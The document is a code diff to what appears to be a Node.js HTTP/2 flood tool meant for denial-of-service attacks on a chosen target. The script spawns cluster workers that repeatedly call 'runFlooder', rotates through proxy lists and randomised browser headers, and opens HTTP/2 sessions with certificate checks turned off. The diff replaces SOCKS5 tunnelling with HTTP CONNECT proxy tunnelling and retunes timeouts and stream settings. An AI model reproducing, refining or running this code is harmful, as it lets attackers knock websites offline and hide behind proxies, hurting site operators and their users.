@@ -50,33 +50,48 @@ if (cluster.isMaster) {
     setInterval(runFlooder, 0);
 }
 class NetSocket {
-    constructor(){}
-    SOCKS5(options, callback) {
-        const proxyParts = options.proxy.replace('socks5://', '').split(':');
-        const socksOptions = {
-            proxy: {
-                host: proxyParts[0],
-                port: parseInt(proxyParts[1]),
-                type: 5
-            },
-            command: 'connect',
-            destination: {
-                host: options.address.split(':')[0],
-                port: 443
-            },
-            timeout: options.timeout
-        };
-        SocksClient.createConnection(socksOptions, (err, info) => {
-            if (err) {
-                return callback(undefined, "error: " + err);
+    constructor() { }
+
+    HTTP(options, callback) {
+        const parsedAddr = options.address.split(":");
+        const addrHost = parsedAddr[0];
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+        const buffer = new Buffer.from(payload);
+
+        const connection = net.connect({
+            host: options.host,
+            port: options.port
+        });
+
+        connection.setTimeout(options.timeout * 600000);
+        connection.setKeepAlive(true, 100000);
+
+        connection.on("connect", () => {
+            connection.write(buffer);
+        });
+
+        connection.on("data", chunk => {
+            const response = chunk.toString("utf-8");
+            const isAlive = response.includes("HTTP/1.1 200");
+            if (isAlive === false) {
+                connection.destroy();
+                return callback(undefined, "error: invalid response from proxy server");
             }
-            const connection = info.socket;
-            connection.setKeepAlive(true, 60000);
             return callback(connection, undefined);
+        });
+
+        connection.on("timeout", () => {
+            connection.destroy();
+            return callback(undefined, "error: timeout exceeded");
+        });
+
+        connection.on("error", error => {
+            connection.destroy();
+            return callback(undefined, "error: " + error);
         });
     }
 }
-const Header = new NetSocket();
+const Socker = new NetSocket();
 const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
 const languages = [
     "en-US",
@@ -139,20 +154,22 @@ function buildHeaders() {
         "priority": "u=0, i",
         "accept-language": randomElement(languages),
         "accept-encoding": "gzip, deflate, br"
+        
     };
     return headers;
 }
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
-    if (!proxyAddr || !proxyAddr.includes(":")) return;
+    const parsedProxy = proxyAddr.split(":");
     const proxyOptions = {
-        proxy: proxyAddr,
+        host: parsedProxy[0],
+        port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
-        timeout: 500000
+        timeout: 100,
     };
-    Header.SOCKS5(proxyOptions, (connection, error) => {
-        if (error) return;
-        connection.setKeepAlive(true, 60000);
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) return
+        connection.setKeepAlive(true, 600000);
         const tlsOptions = {
             ALPNProtocols: ['h2'],
             rejectUnauthorized: false,
@@ -169,8 +186,8 @@ function runFlooder() {
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
-                maxConcurrentStreams: 100,
-                initialWindowSize: 2097152,
+                maxConcurrentStreams: 30,
+                initialWindowSize: 65535,
                 enablePush: false,
             },
             //maxSessionMemory: 32000,
